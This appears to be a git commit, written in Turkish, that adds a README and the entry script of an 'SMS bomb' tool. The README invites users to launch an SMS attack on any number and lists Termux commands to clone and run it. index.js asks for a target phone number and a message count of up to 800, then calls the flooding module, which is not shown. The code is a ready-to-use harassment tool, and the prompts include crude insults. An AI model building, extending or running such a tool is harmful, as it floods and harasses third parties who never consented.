0f61d227b5ab080b8cf6580abf1428deae39e3bd
Zion1TECH <emirkanlioglu35@gmail.com>
2024-01-24 18:58:41 +0300

    upload via termux

---
+++ BENİ OKU.md
@@ -0,0 +1,15 @@
+İstediğiniz numaraya sms saldırısı yapabilirsiniz...
+
+Termuxa gireceğiniz kodları aşağıda verdim
+
+pkg install nodejs
+
+apt upgrade
+
+git clone https://github.com/empro16/ZioN-TECH.git
+
+cd ZioN-TECH
+
+npm install
+
+node index.js
---
+++ index.js
@@ -0,0 +1,25 @@
+const rl = require('readline-sync');
+const colors = require('colors');
+const title = require('./modules/title.js');
+const TeknoEvreniSmsBomb = require('./modules/sms.js');
+
+title('Hosgeldiniz');
+
+let telefon = rl.question('Saldırılacak Numara ? : ' .green);
+if (telefon.length != 10) {
+    console.log('Düzgün Gir AMK Şu Numarayı'.white);
+    process.exit(1);
+}
+title('Numara: ' + telefon);
+
+let miktar = rl.question("( 01-800 ) Adet Gir : ".green);
+if(isNaN(miktar)) return console.log('Lutfen Bir Rakam Giriniz'.red) && process.exit(1);
+if (miktar.length == 0) {
+    console.log('Miktar Giriniz'.red);
+    process.exit(1);
+}
+title(`Telefon: ${telefon} - Miktar: ${miktar}`);
+
+console.log('                                    SİKİŞİ BAŞLATTIM BRO ;) '.white);
+
+TeknoEvreniSmsBomb(telefon, miktar);
